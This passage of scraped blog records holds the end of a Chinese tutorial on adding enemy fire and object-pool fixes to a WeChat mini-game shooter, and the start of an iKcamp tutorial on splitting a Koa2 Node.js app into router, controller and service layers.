bash\" lang=\"bash\"\u003econst BULLET_IMG_SRC = \u003cspan class=\"hljs-string\"\u003e'images/bullet.png'\u003c/span\u003e\nconst BULLET_DOWN_IMG_SRC = \u003cspan class=\"hljs-string\"\u003e'images/bullet-down.png'\u003c/span\u003e\nconst BULLET_WIDTH   = 16\nconst BULLET_HEIGHT  = 30\n\nconst __ = {\n    speed: Symbol(\u003cspan class=\"hljs-string\"\u003e'speed'\u003c/span\u003e)\n}\n\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e databus = new DataBus()\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default class Bullet extends Sprite {\n    constructor({ direction } = { direction: \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e }) {\n        super(direction === \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e ? BULLET_IMG_SRC : BULLET_DOWN_IMG_SRC, BULLET_WIDTH, BULLET_HEIGHT)\n       \n        this.direction = direction;\n\n// 其他代码...\n\n    // 每一帧更新子弹位置\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eupdate\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.direction === \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e) {\n            this.y -= this[__.speed] \n            \n            // 超出屏幕外回收自身\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( this.y \u0026lt; -this.height )\n                databus.removeBullets(this)\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            this.y += this[__.speed]\n\n            // 超出屏幕外回收自身\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( this.y \u0026gt; window.innerHeight + this.height )\n                databus.removeBullets(this)\n        }\n    }\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接着在\u003ccode\u003ejs/npc/enemy.js\u003c/code\u003e结尾部分为敌人装备武器, 子弹速度为敌人自身速度\u003ccode\u003e+5\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport Animation from \u003cspan class=\"hljs-string\"\u003e'../base/animation'\u003c/span\u003e\nimport DataBus   from \u003cspan class=\"hljs-string\"\u003e'../databus'\u003c/span\u003e\nimport Bullet from \u003cspan class=\"hljs-string\"\u003e'../player/bullet'\u003c/span\u003e;\n\nconst ENEMY_IMG_SRC = \u003cspan class=\"hljs-string\"\u003e'images/enemy.png'\u003c/span\u003e\n// 其他代码...\n\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eupdate\u003c/span\u003e\u003c/span\u003e() {\n    this.y += this[__.speed]\n\n    // 对象回收\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( this.y \u0026gt; window.innerHeight + this.height )\n      databus.removeEnemey(this)\n  }\n\n  /**\n   * 敌机射击操作\n   * 射击时机由外部决定\n   */\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eshoot\u003c/span\u003e\u003c/span\u003e() {\n      const bullet = databus.pool.getItemByClass(\u003cspan class=\"hljs-string\"\u003e'bullet'\u003c/span\u003e, Bullet);\n      bullet.init(\n          this.x + this.width / 2 - bullet.width / 2,\n          this.y + 10,\n          this[__.speed] + 5\n      );\n\n      databus.bullets.push(bullet);\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来，在\u003ccode\u003ejs/main.js\u003c/code\u003e中加入敌机的射击逻辑，敌机移动5次、60次时设计。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 其他代码...\n \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e ctx = canvas.getContext(\u003cspan class=\"hljs-string\"\u003e\"2d\"\u003c/span\u003e);\n \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e databus = new DataBus();\n\nconst ENEMY_SPEED = 6;\n// 其他代码...\n\n    /**\n     * 随着帧数变化的敌机生成逻辑\n     * 帧数取模定义成生成的频率\n     */\n    enemyGenerate(playerLevel) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (databus.frame % 60 === 0) {\n            \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e enemy = databus.pool.getItemByClass(\u003cspan class=\"hljs-string\"\u003e\"enemy\"\u003c/span\u003e, Enemy);\n            enemy.init(ENEMY_SPEED);\n            databus.enemys.push(enemy);\n        }\n    }\n\n// 其他代码...\n\n    // 实现游戏帧循环\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eloop\u003c/span\u003e\u003c/span\u003e() {\n        databus.frame++;\n\n        this.update();\n        this.render();\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (databus.frame % 20 === 0) {\n            this.player.shoot();\n            this.music.playShoot();\n        }\n\n        databus.enemys.forEach(enemy =\u0026gt; {\n            const enemyShootPositions = [\n                -enemy.height + ENEMY_SPEED * 5,\n                -enemy.height + ENEMY_SPEED * 60\n            ];\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (enemyShootPositions.indexOf(enemy.y) !== -1) {\n                enemy.shoot();\n                this.music.playShoot();\n            }\n        });\n\n        // 游戏结束停止帧循环\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (databus.gameOver) {\n            this.touchHandler = this.touchEventHandler.bind(this);\n          canvas.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"touchstart\"\u003c/span\u003e, this.touchHandler);\n            this.gameinfo.renderGameOver(ctx, databus.score);\n\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n        }\n\n        window.requestAnimationFrame(this.loop.bind(this), canvas);\n    }\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这时候我们发现，由于不明宇宙的干扰射线的影响，玩家和敌机的子弹不受控制的乱飞。接下来我们就来恢复世界的秩序吧 \u003cem\u003e;\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e经侦测发现是对象池\u003ccode\u003epool\u003c/code\u003e的获取逻辑问题导致子弹不受控问题，我们需要区分获取玩家、每个敌机的子弹\u003c/p\u003e\n\u003cp\u003e首先，对象获取我们加入对象属性的判断，当有传入对象属性时，我们获取所有属性值一致的已回收对象，若没有找到或者对象池为空时，则用属性创建新对象\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  /**\n   * 根据传入的对象标识符，查询对象池\n   * 对象池为空创建新的类，否则从对象池中取\n   */\n  getItemByClass(name, className, properties) {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e pool = this.getPoolBySign(name)\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (pool.length === 0) \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new className(properties);\n   \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!properties) \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e pool.shift();\n   \n    const index = pool.findIndex(item =\u0026gt; {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Object.keys(properties).every(property =\u0026gt; {\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e item[property] === properties[property];\n        });\n    });\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e index !== -1 ? pool.splice(index, 1)[0] : new className(properties)\n  }\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e相应的我们需要给每个子弹设置归属，在\u003ccode\u003ejs/player/bullet.js\u003c/code\u003e中\u003ccode\u003eBullet\u003c/code\u003e类修改\u003ccode\u003econstructor\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default class Bullet extends Sprite {\n    constructor({ direction, owner } = { direction: \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e }) {\n        super(direction === \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e ? BULLET_IMG_SRC : BULLET_DOWN_IMG_SRC, BULLET_WIDTH, BULLET_HEIGHT)\n\n        this.direction = direction;\n\n        this.owner = owner;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接着修改\u003ccode\u003ejs/player/index.js\u003c/code\u003e的\u003ccode\u003eshoot\u003c/code\u003e，为其中创建的\u003ccode\u003ebullets\u003c/code\u003e提供归属\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    /**\n     * 玩家射击操作\n     * 射击时机由外部决定\n     */\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eshoot\u003c/span\u003e\u003c/span\u003e() {\n      \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; this.level; i++) {\n        const bullet = databus.pool.getItemByClass(\u003cspan class=\"hljs-string\"\u003e'bullet'\u003c/span\u003e, Bullet, { direction: \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e, owner: this });\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同样处理\u003ccode\u003ejs/npc/enemy.js\u003c/code\u003e的\u003ccode\u003eshoot\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  /**\n   * 敌机射击操作\n   * 射击时机由外部决定\n   */\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eshoot\u003c/span\u003e\u003c/span\u003e() {\n      const bullet = databus.pool.getItemByClass(\u003cspan class=\"hljs-string\"\u003e'bullet'\u003c/span\u003e, Bullet, { direction: \u003cspan class=\"hljs-string\"\u003e'down'\u003c/span\u003e, owner: this });\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后处理\u003ccode\u003ejs/databus.js\u003c/code\u003e中\u003ccode\u003eremoveBullets\u003c/code\u003e的回收逻辑\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  /**\n   * 回收子弹，进入对象池\n   * 此后不进入帧循环\n   */\n  removeBullets(bullet) {\n    const index = this.bullets.findIndex(b =\u0026gt; b === bullet);\n\n    bullet.visible = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\n    this.bullets.splice(index, 1);\n\n    this.pool.recover(\u003cspan class=\"hljs-string\"\u003e'bullet'\u003c/span\u003e, bullet)\n  }\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这时候敌我的子弹就恢复正常了。不过这时候玩家中弹并不会死亡，现在来让玩家\u003ccode\u003eGo Die\u003c/code\u003e吧。在\u003ccode\u003ejs/main.js\u003c/code\u003e的\u003ccode\u003ecollisionDetection\u003c/code\u003e我们判断增加每一颗子弹如果是敌方的，就判断其是否打中玩家，是则游戏结束。玩家的子弹判断保持不变。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    // 全局碰撞检测\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecollisionDetection\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e that = this;\n\n        databus.bullets.forEach(bullet =\u0026gt; {\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0, il = databus.enemys.length; i \u0026lt; il; i++) {\n                \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e enemy = databus.enemys[i];\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (bullet.owner instanceof Enemy) {\n                    databus.gameOver = this.player.isCollideWith(bullet);\n                } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!enemy.isPlaying \u0026amp;\u0026amp; enemy.isCollideWith(bullet)) {\n                    enemy.playAnimation();\n                    that.music.playExplosion();\n\n                    bullet.visible = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n                    databus.score += 1;\n\n                    \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n                }\n            }\n        });\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e到此整个简单改造计划就结束了，以后还可以添加武器系统，boss战等等。下面是改造后的游戏动图录屏\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"demo\" src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6f9601886b72?w=318\u0026amp;h=566\u0026amp;f=gif\u0026amp;s=2426833\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e本文始发于本人的公众号：\u003cstrong\u003e枫之叶\u003c/strong\u003e。公众号二维码\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6fa88d105d6d?w=258\u0026amp;h=258\u0026amp;f=jpeg\u0026amp;s=15517\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514979817.7345","__v":0}
{"_id":{"$oid":"5a4cc1fa37991328ecbc745e"},"id":"5a4c501af265da4327189da6","author":{"$oid":"5a4cc1f937991328ecbc7447"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/3/160ba1db1d86e5dd?w=1604\u0026h=964\u0026f=png\u0026s=869114","https://user-gold-cdn.xitu.io/2017/12/14/1605309af5a7dfa2?w=1426\u0026h=778\u0026f=png\u0026s=414615","https://dn-mhke0kuv.qbox.me/3326ff01e1f06fd6dc3c.png"],"screenShot":null}],"title":"iKcamp｜基于Koa2搭建Node.js实战（含视频）☞ 代码分层","meta":{"likeCount":0},"tag":["JavaScript","前端","Node.js","API"],"comment":[],"shortContent":"在前面几节中，我们已经实现了项目中的几个常见操作：启动服务器、路由中间件、Get 和 Post 形式的请求处理等。现在你已经迈出了走向成功的第一步。 目前，整个示例中所有的代码都写在 app.js 中。然而在业务代码持续增大，场景更加复杂的情况下，这种做法无论是对后期维护还是对…","content":"\u003cp\u003e视频地址：\u003ca target=\"_blank\" href=\"https://www.cctalk.com/v/15114923889408\"\u003ehttps://www.cctalk.com/v/15114923889408\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160ba1db1d86e5dd?w=1604\u0026amp;h=964\u0026amp;f=png\u0026amp;s=869114\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e文章\u003c/h1\u003e\n\u003cp\u003e在前面几节中，我们已经实现了项目中的几个常见操作：启动服务器、路由中间件、\u003ccode\u003eGet\u003c/code\u003e 和 \u003ccode\u003ePost\u003c/code\u003e 形式的请求处理等。现在你已经迈出了走向成功的第一步。\u003c/p\u003e\n\u003cp\u003e目前，整个示例中所有的代码都写在 \u003ccode\u003eapp.js\u003c/code\u003e 中。然而在业务代码持续增大，场景更加复杂的情况下，这种做法无论是对后期维护还是对患有强迫症的同学来说都不是好事。所以我们现在要做的就是：『分梨』。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e分离 router\u003c/h2\u003e\n\u003cp\u003e路由部分的代码可以分离成一个独立的文件，并根据个人喜好放置于项目根目录下，或独立放置于 \u003ccode\u003erouter\u003c/code\u003e 文件夹中。在这里，我们将它命名为 \u003ccode\u003erouter.js\u003c/code\u003e并将之放置于根目录下。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e修改路由 router.js\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e router = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'koa-router'\u003c/span\u003e)()\n\n  \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eapp\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    router.get(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n      ctx.response.body = \u003cspan class=\"hljs-string\"\u003e`\u0026lt;h1\u0026gt;index page\u0026lt;/h1\u0026gt;`\u003c/span\u003e\n    })\n    \n    router.get(\u003cspan class=\"hljs-string\"\u003e'/home'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(ctx.request.query)\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(ctx.request.querystring)\n      ctx.response.body = \u003cspan class=\"hljs-string\"\u003e'\u0026lt;h1\u0026gt;HOME page\u0026lt;/h1\u0026gt;'\u003c/span\u003e\n    })\n    \n    router.get(\u003cspan class=\"hljs-string\"\u003e'/home/:id/:name'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next)=\u0026gt;{\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(ctx.params)\n      ctx.response.body = \u003cspan class=\"hljs-string\"\u003e'\u0026lt;h1\u0026gt;HOME page /:id/:name\u0026lt;/h1\u0026gt;'\u003c/span\u003e\n    })\n    \n    router.get(\u003cspan class=\"hljs-string\"\u003e'/user'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next)=\u0026gt;{\n      ctx.response.body = \n      \u003cspan class=\"hljs-string\"\u003e`\n        \u0026lt;form action=\"/user/register\" method=\"post\"\u0026gt;\n          \u0026lt;input name=\"name\" type=\"text\" placeholder=\"请输入用户名：ikcamp\"/\u0026gt; \n          \u0026lt;br/\u0026gt;\n          \u0026lt;input name=\"password\" type=\"text\" placeholder=\"请输入密码：123456\"/\u0026gt;\n          \u0026lt;br/\u0026gt; \n          \u0026lt;button\u0026gt;GoGoGo\u0026lt;/button\u0026gt;\n        \u0026lt;/form\u0026gt;\n      `\u003c/span\u003e\n    })\n    \n    \u003cspan class=\"hljs-comment\"\u003e// 增加响应表单请求的路由\u003c/span\u003e\n    router.post(\u003cspan class=\"hljs-string\"\u003e'/user/register'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next)=\u0026gt;{\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e {name, password} = ctx.request.body\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e( name == \u003cspan class=\"hljs-string\"\u003e'ikcamp'\u003c/span\u003e \u0026amp;\u0026amp; password == \u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e ){\n        ctx.response.body = \u003cspan class=\"hljs-string\"\u003e`Hello， \u003cspan class=\"hljs-subst\"\u003e${name}\u003c/span\u003e！`\u003c/span\u003e \n      }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n        ctx.response.body = \u003cspan class=\"hljs-string\"\u003e'账号信息错误'\u003c/span\u003e\n      }\n    })\n    \n    app.use(router.routes())\n      .use(router.allowedMethods())\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e修改 app.js\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e Koa = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'koa'\u003c/span\u003e)\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e bodyParser = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'koa-bodyparser'\u003c/span\u003e)\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e app = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Koa()\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e router = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./router'\u003c/span\u003e)\n\n  app.use(bodyParser())\n\n  router(app)\n\n  app.listen(\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e, () =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'server is running at http://localhost:3000'\u003c/span\u003e)\n  })\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代码看起来清爽了很多。\u003c/p\u003e\n\u003cp\u003e然而到了这一步，还是不能够高枕无忧。\u003ccode\u003erouter\u003c/code\u003e 文件独立出来以后，应用的主文件 \u003ccode\u003eapp.js\u003c/code\u003e 虽然暂时看起来比较清爽，但这是在只有一个路由，并且处理函数也非常简单的情况下。如果有多个路由，每个处理函数函数代码量也都繁复可观，这就不是主管们喜闻乐见的事情了。\u003c/p\u003e\n\u003cp\u003e接下来我们对结构进行进一步优化。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e分离 controller 层\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我们把路由对应的业务逻辑也分离出来。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e新增 controller/home.js\u003c/h3\u003e\n\u003cp\u003e新建 \u003ccode\u003econtroller\u003c/code\u003e 文件夹，增加一个 \u003ccode\u003ehome.js\u003c/code\u003e 文件，并从 \u003ccode\u003erouter.js\u003c/code\u003e 中提取出业务逻辑代码。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e  \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n    \u003cspan class=\"hljs-attr\"\u003eindex\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n      ctx.response.body = \u003cspan class=\"hljs-string\"\u003e`\u0026lt;h1\u0026gt;index page\u0026lt;/h1\u0026gt;`\u003c/span\u003e\n    },\n    \u003cspan class=\"hljs-attr\"\u003ehome\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(ctx.request.query)\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(ctx.request.querystring)\n      ctx.response.body = \u003cspan class=\"hljs-string\"\u003e'\u0026lt;h1\u0026gt;HOME page\u0026lt;/h1\u0026gt;'\u003c/span\u003e\n    },\n    \u003cspan class=\"hljs-attr\"\u003ehomeParams\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(ctx.params)\n      ctx.response.body = \u003cspan class=\"hljs-string\"\u003e'\u0026lt;h1\u0026gt;HOME page /:id/:name\u0026lt;/h1\u0026gt;'\u003c/span\u003e\n    },\n    \u003cspan class=\"hljs-attr\"\u003elogin\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n      ctx.response.body =\n        \u003cspan class=\"hljs-string\"\u003e`\n        \u0026lt;form action=\"/user/register\" method=\"post\"\u0026gt;\n          \u0026lt;input name=\"name\" type=\"text\" placeholder=\"请输入用户名：ikcamp\"/\u0026gt; \n          \u0026lt;br/\u0026gt;\n          \u0026lt;input name=\"password\" type=\"text\" placeholder=\"请输入密码：123456\"/\u0026gt;\n          \u0026lt;br/\u0026gt; \n          \u0026lt;button\u0026gt;GoGoGo\u0026lt;/button\u0026gt;\n        \u0026lt;/form\u0026gt;\n      `\u003c/span\u003e\n    },\n    \u003cspan class=\"hljs-attr\"\u003eregister\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e {\n        name,\n        password\n      } = ctx.request.body\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (name == \u003cspan class=\"hljs-string\"\u003e'ikcamp'\u003c/span\u003e \u0026amp;\u0026amp; password == \u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e) {\n        ctx.response.body = \u003cspan class=\"hljs-string\"\u003e`Hello， \u003cspan class=\"hljs-subst\"\u003e${name}\u003c/span\u003e！`\u003c/span\u003e\n      } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        ctx.response.body = \u003cspan class=\"hljs-string\"\u003e'账号信息错误'\u003c/span\u003e\n      }\n    }\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e修改路由 router.js\u003c/h3\u003e\n\u003cp\u003e修改 \u003ccode\u003erouter.js\u003c/code\u003e 文件，在里面引入 \u003ccode\u003econtroler/home\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e router = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'koa-router'\u003c/span\u003e)()\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e HomeController = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./controller/home'\u003c/span\u003e)\n  \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eapp\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    router.get( \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, HomeController.index )\n    \n    router.get(\u003cspan class=\"hljs-string\"\u003e'/home'\u003c/span\u003e, HomeController.home)\n    \n    router.get(\u003cspan class=\"hljs-string\"\u003e'/home/:id/:name'\u003c/span\u003e, HomeController.homeParams)\n    \n    router.get(\u003cspan class=\"hljs-string\"\u003e'/user'\u003c/span\u003e, HomeController.login)\n    \n    router.post(\u003cspan class=\"hljs-string\"\u003e'/user/register'\u003c/span\u003e, HomeController.register)\n    \n    app.use(router.routes())\n      .use(router.allowedMethods())\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如此，将每个路由的处理逻辑分离到 \u003ccode\u003econtroller\u003c/code\u003e 下的独立文件当中，便于后期维护。\u003c/p\u003e\n\u003cp\u003e目前的代码结构已经比较清晰了，适用于以 \u003ccode\u003enode\u003c/code\u003e 作为中间层、中转层的项目。如果想要把 \u003ccode\u003enode\u003c/code\u003e 作为真正的后端去操作数据库等，\u003cstrong\u003e建议\u003c/strong\u003e再分出一层 \u003ccode\u003eservice\u003c/code\u003e，用于处理数据层面的交互，比如调用 \u003ccode\u003emodel\u003c/code\u003e 处理数据库，调用第三方接口等，而\u003ccode\u003econtroller\u003c/code\u003e 里面只做一些简单的参数处理。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e分离 service 层\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这一层的分离，\u003cstrong\u003e非必需\u003c/strong\u003e，可以根据项目情况适当增加，或者把所有的业务逻辑都放置于 \u003ccode\u003econtroller\u003c/code\u003e 当中。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e新建 service/home.js\u003c/h3\u003e\n\u003cp\u003e新建 \u003ccode\u003eservice\u003c/code\u003e 文件夹，并于该文件夹下新增一个 \u003ccode\u003ehome.js\u003c/code\u003e 文件，用于抽离 \u003ccode\u003econtroller/home.js\u003c/code\u003e 中的部分代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e  \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n    \u003cspan class=\"hljs-attr\"\u003eregister\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(name, pwd) =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e data \n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (name == \u003cspan class=\"hljs-string\"\u003e'ikcamp'\u003c/span\u003e \u0026amp;\u0026amp; pwd == \u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e) {\n        data = \u003cspan class=\"hljs-string\"\u003e`Hello， \u003cspan class=\"hljs-subst\"\u003e${name}\u003c/span\u003e！`\u003c/span\u003e\n      } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        data = \u003cspan class=\"hljs-string\"\u003e'账号信息错误'\u003c/span\u003e\n      